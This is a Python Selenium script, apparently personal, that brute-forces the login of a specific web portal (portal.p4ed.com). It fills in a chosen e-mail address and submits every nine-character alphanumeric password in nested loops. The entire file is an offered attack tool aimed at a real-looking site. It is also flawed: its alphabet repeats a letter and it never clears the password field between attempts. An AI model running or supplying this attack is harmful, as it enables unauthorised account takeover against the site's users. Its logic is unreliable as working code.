# Brute force password cracker
from selenium import webdriver


def main():
    email = input('E-mail: ')
    options = webdriver.ChromeOptions()
    options.add_argument('--user-data-dir=/home/davi/.config/google-chrome/Default')
    options.add_argument('--profile-directory=Default')

    driver = webdriver.Chrome(executable_path='/home/davi/Downloads/chromedriver_linux64/chromedriver', options=options)
    driver.get('https://portal.p4ed.com')
    email_button = driver.find_element_by_id('txtConta')
    email_button.send_keys(email)
    alphabet = 'abcdefghijklkmnopqrstuvwxyz'
    p = []
    for i in range(len(alphabet)):
        p.append(alphabet[i])
        p.append(alphabet[i].upper())
    for j in range(10):
        p.append(str(j))
    for a in p:
        for b in p:
            for c in p:
                for d in p:
                    for e in p:
                        for f in p:
                            for g in p:
                                for h in p:
                                    for k in p:
                                        pwd = driver.find_element_by_id('Password')
                                        pwd.send_keys(a + b + c + d + e + f + g + h + k)
                                        print(a + b + c + d + e + f + g + h + k)
                                        pwd.submit()

    return


if __name__ == '__main__':
    main()
